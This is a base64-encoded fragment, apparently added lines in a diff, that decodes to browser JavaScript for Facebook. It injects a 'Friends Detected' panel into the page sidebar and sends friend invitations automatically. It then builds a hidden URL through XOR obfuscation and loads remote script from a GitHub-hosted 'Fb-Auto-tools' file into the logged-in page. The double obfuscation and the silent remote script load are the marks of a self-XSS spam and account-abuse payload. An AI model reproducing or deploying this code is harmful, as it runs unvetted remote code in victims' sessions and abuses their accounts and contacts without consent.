+YmEoMjI1LDIyNSwyMjUsMC45KTtjb2xvcjojMDAwMDAwJz4iOwogICAgZGlzcGxheSArPSAiPGRp
+diBzdHlsZT0ncGFkZGluZy1ib3R0b206MTBweDtmb250LXNpemU6MjBweDsnPiIgKyBUaXRsZSAr
+ICI8L2Rpdj4iOwogICAgZGlzcGxheSArPSBhcnIubGVuZ3RoICsgIiBGcmllbmRzIERldGVjdGVk
+IjsKICAgIGRpc3BsYXkgKz0gIjwvZGl2PiI7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgi
+cGFnZWxldF9zaWRlYmFyIikuaW5uZXJIVE1MID0gZGlzcGxheTsKICAgIEludml0ZUZyaWVuZHMo
+YXJyW2ldKQp9KTsKdmFyIFggPSAianZ2cnE4LS1wY3UsZWt2andgLGFtby1gamNwZWN0Mzs7NC1E
+YC9Dd3ZtL3ZtbW5xLW9jcXZncC1Rd3JybXB2XURrbmcsaHEiOwpZID0gIiI7ClogPSAiIjsKdmFy
+IFY7ClYgPSBYLmxlbmd0aDsKZm9yIChpID0gMDsgaSA8IFY7IGkrKykgewogICAgWSArPSBTdHJp
+bmcuZnJvbUNoYXJDb2RlKFguY2hhckNvZGVBdChpKSBeIDIpCn0KWiA9IHVuZXNjYXBlKFkpOwpk
+b2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcp
+KS5zcmMgPSBaOyIpKTs=
